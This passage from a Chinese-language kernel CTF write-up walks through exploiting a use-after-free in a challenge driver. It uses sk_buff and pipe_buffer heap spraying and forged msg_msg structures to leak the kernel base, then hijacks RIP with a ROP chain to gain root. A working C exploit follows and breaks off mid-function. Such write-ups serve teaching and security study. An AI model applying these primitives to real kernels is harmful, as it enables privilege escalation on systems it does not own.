href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-构造-UAF，堆喷-sk-buff-定位-victim-队列">Step.II 构造 UAF，堆喷 <code>sk_buff</code> 定位 victim 队列</h3><p>此时我们直接利用题目的功能将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/05/17/sCflaOFvMSzhGUV.png" alt="image.png"></p><p>但此时我们无法得知是哪一个消息队列命中了 UAF object，这个时候我们选用 <code>sk_buff</code> 堆喷劫持该结构体</p><p>类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，<strong>我们不难想到的是</strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>那么我们利用 <code>sk_buff</code> 堆喷向这个 UAF object 中写入什么数据呢？其实这里我们可以随便写入一些内容，之后我们使用 <code>MSG_COPY</code> flag 进行消息拷贝时便会失败，但不会 kernel panic，<strong>因此我们可以通过判断是否读取消息失败来定位命中 UAF 的消息队列</strong></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址">Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何继续利用这个 UAF，由于其位于消息队列上，所以我们可以利用消息队列的性质来完成利用</p><p>首先我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址">Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权">Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/05/17/MjuSNf7tmw64hTn.png" alt="image.png"></p><h3 id="Final-EXPLOIT">Final EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_ADD     0x1234</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_EDIT    0x4321</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_SHOW 0xbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_DEL     0xdead</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><span class="hljs-type">size_t</span> kernel_offset, kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;<br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], pipe_fd2[<span class="hljs-number">2</span>], pipe_fd_1;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_ADD);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_DEL);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> 